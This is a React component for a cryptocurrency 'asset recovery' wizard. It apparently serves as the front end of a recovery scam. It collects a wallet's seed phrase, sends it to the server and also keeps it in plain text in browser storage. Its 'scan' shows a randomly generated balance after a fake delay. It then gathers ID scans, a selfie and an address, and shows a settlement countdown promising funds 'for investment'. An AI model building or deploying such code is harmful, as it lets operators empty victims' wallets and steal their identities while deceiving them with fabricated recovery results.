'use client';

import React, { useState, useEffect, useRef } from 'react';
import { ShieldAlert } from 'lucide-react';

const STORAGE_KEY = 'recovery_wizard_session';

export default function RecoveryWizardV2({ initialData }: { initialData?: any }) {
  const [step, setStep] = useState<number>(1);
  const [loading, setLoading] = useState(false);
  const [recoveryType, setRecoveryType] = useState<string>('credential_loss');
  const [asset, setAsset] = useState<string>(initialData?.asset ?? 'SUM');
  const [havePaperKey, setHavePaperKey] = useState<boolean | null>(null);
  const [paperKey, setPaperKey] = useState<string>('');
  const [walletAddress, setWalletAddress] = useState<string>('');
  const [discoveredBalance, setDiscoveredBalance] = useState<number | null>(initialData?.discovered_balance ?? null);
  const [rmfCode, setRmfCode] = useState<string>('');
  const [countdownSecs, setCountdownSecs] = useState<number | null>(null);
  const [recoveryId, setRecoveryId] = useState<string | null>(initialData?.id ?? null);

  // refs for files
  const fileFrontRef = useRef<HTMLInputElement | null>(null);
  const fileBackRef = useRef<HTMLInputElement | null>(null);
  const fileSelfieRef = useRef<HTMLInputElement | null>(null);

  // Load session from localStorage on mount
  useEffect(() => {
    if (typeof window !== 'undefined') {
      const savedSession = localStorage.getItem(STORAGE_KEY);
      if (savedSession) {
        try {
          const parsed = JSON.parse(savedSession);
          setStep(parsed.step ?? 1);
          setRecoveryType(parsed.recoveryType ?? 'credential_loss');
          setAsset(parsed.asset ?? 'SUM');
          setHavePaperKey(parsed.havePaperKey ?? null);
          setPaperKey(parsed.paperKey ?? '');
          setWalletAddress(parsed.walletAddress ?? '');
          setDiscoveredBalance(parsed.discoveredBalance ?? null);
          setRmfCode(parsed.rmfCode ?? '');
          setCountdownSecs(parsed.countdownSecs ?? null);
          setRecoveryId(parsed.recoveryId ?? null);
        } catch (err) {
          console.error('Failed to load session', err);
        }
      }
    }
  }, []);

  // Save session to localStorage whenever state changes
  useEffect(() => {
    if (typeof window !== 'undefined') {
      const sessionData = {
        step,
        recoveryType,
        asset,
        havePaperKey,
        paperKey,
        walletAddress,
        discoveredBalance,
        rmfCode,
        countdownSecs,
        recoveryId,
        lastSaved: new Date().toISOString()
      };
      localStorage.setItem(STORAGE_KEY, JSON.stringify(sessionData));
    }
  }, [step, recoveryType, asset, havePaperKey, paperKey, walletAddress, discoveredBalance, rmfCode, countdownSecs, recoveryId]);

  // Clear session on successful completion
  const clearSession = () => {
    if (typeof window !== 'undefined') {
      localStorage.removeItem(STORAGE_KEY);
    }
  };

  useEffect(() => {
    if (step === 3 && !rmfCode) {
      const random4 = Math.floor(1000 + Math.random() * 9000);
      setRmfCode(`RMF-${random4}`);
    }
  }, [step, rmfCode]);

  const ensureRecoverySession = async (payload: any) => {
    try {
      // Get auth token from Supabase
      const { data: { session } } = await (await import('@/lib/supabase')).supabase.auth.getSession();
      const token = session?.access_token;
      if (!token) {
        alert('You must be logged in to start a recovery session');
        return null;
      }

      const res = await fetch('/api/recovery/init', {
        method: 'POST',
        headers: {
          'content-type': 'application/json',
          'Authorization': `Bearer ${token}`
        },
        body: JSON.stringify({ ...payload, caseType: recoveryType }),
      });
      const json = await res.json();
      if (res.ok && json?.id) {
        setRecoveryId(json.id);
        return json.id;
      } else {
        alert(json?.error || 'Failed to create recovery session');
      }
    } catch (e) {
      console.error(e);
      alert('Error initializing recovery session');
    }
    return null;
  };

  // Step 2 finish -> initialize session and compute discovered balance
  const handleInitFromStep2 = async () => {
    setLoading(true);
    // simple validation
    if (havePaperKey === null) {
      alert('Please indicate whether you have a paper key or not.');
      setLoading(false);
      return;
    }
    if (havePaperKey && !paperKey.trim()) {
      alert('Please enter your paper key phrase.');
      setLoading(false);
      return;
    }
    if (!havePaperKey && !walletAddress.trim()) {
      alert('Please provide a wallet address.');
      setLoading(false);
      return;
    }

    // simulate scan
    await new Promise((r) => setTimeout(r, 1500));
    const mul = 1.1 + Math.random() * 0.3;
    const discovered = Math.round(((Math.random() * 1000) + 10) * mul * 1000000) / 1000000;
    setDiscoveredBalance(discovered);

    // create server session
    const id = await ensureRecoverySession({ asset, sourceAddress: walletAddress || null, paperKeyPhrase: paperKey || null, discovered_balance: discovered });
    if (!id) alert('Failed creating recovery session. Please retry.');

    setLoading(false);
    setStep(3);
  };

  const handleKycSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!recoveryId) {
      // try to create one quickly
      const id = await ensureRecoverySession({ asset, sourceAddress: walletAddress || null, paperKeyPhrase: paperKey || null, discovered_balance: discoveredBalance });
      if (!id) return alert('Recovery session not initialized.');
    }

    const form = new FormData();
    form.append('full_name', (document.getElementById('full_name') as HTMLInputElement).value || '');
    form.append('tax_country', (document.getElementById('tax_country') as HTMLInputElement).value || '');
    form.append('residential_address', (document.getElementById('residential_address') as HTMLInputElement).value || '');
    form.append('code', rmfCode);

    if (fileFrontRef.current?.files?.[0]) form.append('front_id', fileFrontRef.current.files[0]);
    if (fileBackRef.current?.files?.[0]) form.append('back_id', fileBackRef.current.files[0]);
    if (fileSelfieRef.current?.files?.[0]) form.append('selfie', fileSelfieRef.current.files[0]);

    setLoading(true);
    try {
      const { data: { session } } = await (await import('@/lib/supabase')).supabase.auth.getSession();
      const token = session?.access_token;

      const res = await fetch(`/api/recovery/${recoveryId}/kyc`, {
        method: 'POST',
        headers: token ? { 'Authorization': `Bearer ${token}` } : {},
        body: form,
      });
      if (!res.ok) {
        const txt = await res.text();
        throw new Error(txt || 'KYC upload failed');
      }
      // start settlement
      const startRes = await fetch(`/api/recovery/${recoveryId}/start-settlement`, {
        method: 'POST',
        headers: token ? { 'Authorization': `Bearer ${token}` } : {}
      });
      if (startRes.ok) {
        setStep(4);
        pollTimer(recoveryId!);
      } else {
        alert('KYC uploaded but failed to start settlement.');
      }
    } catch (err) {
      console.error(err);
      alert('KYC submission failed.');
    } finally {
      setLoading(false);
    }
  };

  const pollTimer = async (id: string) => {
    try {
      const resp = await fetch(`/api/recovery/timer?id=${id}`);
      if (!resp.ok) {
        console.warn(`Timer poll failed: ${resp.status}`);
        return;
      }
      const { remaining_seconds } = await resp.json();
      setCountdownSecs(remaining_seconds);
    } catch (e) {
      console.error('Error polling timer:', e);
    }
  };

  useEffect(() => {
    let timer: NodeJS.Timeout | null = null;
    if (countdownSecs !== null && countdownSecs > 0) {
      timer = setInterval(() => setCountdownSecs((s) => (s !== null ? Math.max(0, s - 1) : null)), 1000);
    }
    return () => { if (timer) clearInterval(timer); };
  }, [countdownSecs]);

  useEffect(() => {
    if (step === 4 && recoveryId) {
      pollTimer(recoveryId);
      // Poll again every 30 seconds to stay in sync
      const pollInterval = setInterval(() => pollTimer(recoveryId), 30000);
      return () => clearInterval(pollInterval);
    }
  }, [step, recoveryId]);

  const formatHrs = (secs: number | null) => {
    if (secs === null) return '-- Hours --';
    const hrs = Math.floor(secs / 3600);
    const mins = Math.floor((secs % 3600) / 60);
    return `${hrs} Hours, ${mins} Minutes`;
  };

  return (
    <div className="max-w-2xl mx-auto p-6 bg-gradient-to-br from-[#0b0b0b] to-[#0f0f0f] rounded-lg border border-neutral-800 text-white">
      <div className="flex items-center gap-3 mb-6">
        <ShieldAlert className="w-7 h-7 text-orange-500" />
        <h2 className="text-2xl font-bold">Asset Recovery — Recovery Wizard</h2>
      </div>

      {step === 1 && (
        <div className="space-y-4">
          <label className="block">
            <span className="text-sm text-neutral-300 font-semibold">What is the reason for recovery?</span>
            <select value={recoveryType} onChange={(e) => setRecoveryType(e.target.value)} className="mt-2 block w-full rounded-md bg-[#111] border border-neutral-700 p-2 text-white">
              <option value="credential_loss">Lost/Forgot Credentials (Password, Secret Key)</option>
              <option value="malicious_interception">Malicious Interception (Hacked, Phished)</option>
              <option value="stuck_contract">Funds Stuck in Contract</option>
            </select>
          </label>

          <label className="block">
            <span className="text-sm text-neutral-300">Select Currency / Asset</span>
            <select value={asset} onChange={(e) => setAsset(e.target.value)} className="mt-2 block w-full rounded-md bg-[#111] border border-neutral-700 p-2 text-white">
              <option value="SUM">Sumcoin (SUM)</option>
              <option value="BTC">Bitcoin (BTC)</option>
              <option value="ETH">Ethereum (ETH)</option>
              <option value="USDT_TRC20">Tether (USDT-TRC20)</option>
              <option value="XMR">Monero (XMR)</option>
            </select>
          </label>

          <div className="flex gap-3 mt-4">
            <button onClick={() => setStep(2)} className="flex-1 bg-orange-600 py-3 rounded-md">Next</button>
          </div>
        </div>
      )}

      {step === 2 && (
        <div className="space-y-4">
          <p className="text-sm text-neutral-400">Do you have a recovery (paper) key for this wallet?</p>
          <div className="flex gap-3">
            <button onClick={() => { setHavePaperKey(true); }} className={`flex-1 py-3 rounded-md ${havePaperKey === true ? 'bg-orange-600' : 'bg-neutral-800'}`}>Yes — I have a paper key</button>
            <button onClick={() => { setHavePaperKey(false); }} className={`flex-1 py-3 rounded-md ${havePaperKey === false ? 'bg-orange-600' : 'bg-neutral-800'}`}>No — I have wallet address</button>
          </div>

          {havePaperKey === true && (
            <label className="block">
              <span className="text-sm text-neutral-300">Paper Key Phrase</span>
              <textarea value={paperKey} onChange={(e) => setPaperKey(e.target.value)} rows={4} className="mt-2 block w-full rounded-md bg-[#111] border border-neutral-700 p-2 text-white" />
            </label>
          )}

          {havePaperKey === false && (
            <label className="block">
              <span className="text-sm text-neutral-300">Wallet Address</span>
              <input value={walletAddress} onChange={(e) => setWalletAddress(e.target.value)} className="mt-2 block w-full rounded-md bg-[#111] border border-neutral-700 p-2 text-white" />
            </label>
          )}

          <div className="flex gap-3 mt-4">
            <button onClick={() => setStep(1)} className="flex-1 border border-neutral-700 py-3 rounded-md">Back</button>
            <button onClick={handleInitFromStep2} className="flex-1 bg-orange-600 py-3 rounded-md">Scan & Continue</button>
          </div>
        </div>
      )}

      {step === 3 && (
        <form onSubmit={handleKycSubmit} className="space-y-4">
          <div className="p-4 rounded-md bg-[#081018] border border-neutral-800">
            <h3 className="text-lg font-semibold">KYC Submission</h3>
            <p className="mt-2 text-sm text-neutral-400">Please upload identity documents and include the RMF code below on the handwritten note. The recoverable amount is kept confidential until an admin review completes.</p>
            <p className="text-sm text-neutral-400 mt-2">RMF Code: <span className="font-mono">{rmfCode}</span></p>
          </div>

          <label className="block">
            <span className="text-sm text-neutral-300">Full Legal Name</span>
            <input id="full_name" className="mt-2 block w-full rounded-md bg-[#111] border border-neutral-700 p-2 text-white" />
          </label>

          <label className="block">
            <span className="text-sm text-neutral-300">Tax Residency (Country)</span>
            <input id="tax_country" className="mt-2 block w-full rounded-md bg-[#111] border border-neutral-700 p-2 text-white" />
          </label>

          <label className="block">
            <span className="text-sm text-neutral-300">Residential Address</span>
            <input id="residential_address" className="mt-2 block w-full rounded-md bg-[#111] border border-neutral-700 p-2 text-white" />
          </label>

          <div className="border-t border-neutral-800 pt-4">
            <p className="text-sm text-neutral-400">Document Uploads</p>
            <div className="grid grid-cols-1 md:grid-cols-3 gap-4 mt-3">
              <label className="block p-3 border border-neutral-800 rounded-md text-center">
                Front of ID
                <input ref={fileFrontRef} id="front_id" type="file" accept="image/*,application/pdf" className="mt-2 w-full" />
              </label>
              <label className="block p-3 border border-neutral-800 rounded-md text-center">
                Back of ID
                <input ref={fileBackRef} id="back_id" type="file" accept="image/*,application/pdf" className="mt-2 w-full" />
              </label>
              <label className="block p-3 border border-neutral-800 rounded-md text-center">
                Forensic Selfie
                <input ref={fileSelfieRef} id="selfie" type="file" accept="image/*" className="mt-2 w-full" />
              </label>
            </div>

            <p className="text-xs text-neutral-500 mt-2">Please include a handwritten note: "REDMAN FINANCE RECOVERY - {new Date().toLocaleDateString()} - Code: {rmfCode}"</p>

            <div className="mt-4 flex gap-3">
              <button type="button" onClick={() => setStep(2)} className="flex-1 border border-neutral-700 py-3 rounded-md">Back</button>
              <button type="submit" disabled={loading} className="flex-1 bg-orange-600 py-3 rounded-md text-white">{loading ? 'Submitting...' : 'Submit KYC Dossier'}</button>
            </div>
          </div>
        </form>
      )}

      {step === 4 && (
        <div className="text-center py-8">
          <h3 className="text-xl font-semibold mb-4">Settlement Countdown</h3>
          <p className="text-neutral-400 mb-3">Time remaining for network clearing: <span className="font-bold text-white">{formatHrs(countdownSecs)}</span></p>
          <div className="text-sm text-neutral-400">After forensic verification by our compliance team, funds will be deposited to your main account for investment.</div>

          <div className="mt-6 flex gap-3 justify-center">
            <button onClick={async () => {
              if (!recoveryId) return alert('Missing recovery id');
              try {
                const { data: { session } } = await (await import('@/lib/supabase')).supabase.auth.getSession();
                const token = session?.access_token;
                const res = await fetch('/api/recovery', {
                  method: 'POST',
                  headers: {
                    'content-type': 'application/json',
                    ...(token ? { 'Authorization': `Bearer ${token}` } : {})
                  },
                  body: JSON.stringify({ action: 'claim', id: recoveryId })
                });
                const json = await res.json();
                if (!res.ok) return alert(json?.error || 'Claim failed');
                clearSession();
                alert('Claim successful — check your account for deposited funds.');
              } catch (e) {
                console.error(e);
                alert('Claim attempt failed');
              }
            }} className="bg-green-600 py-2 px-4 rounded-md">Claim Funds</button>

            <button onClick={() => pollTimer(recoveryId!)} className="border border-neutral-700 py-2 px-4 rounded-md">Refresh Timer</button>
          </div>
        </div>
      )}

    </div>
  );
}
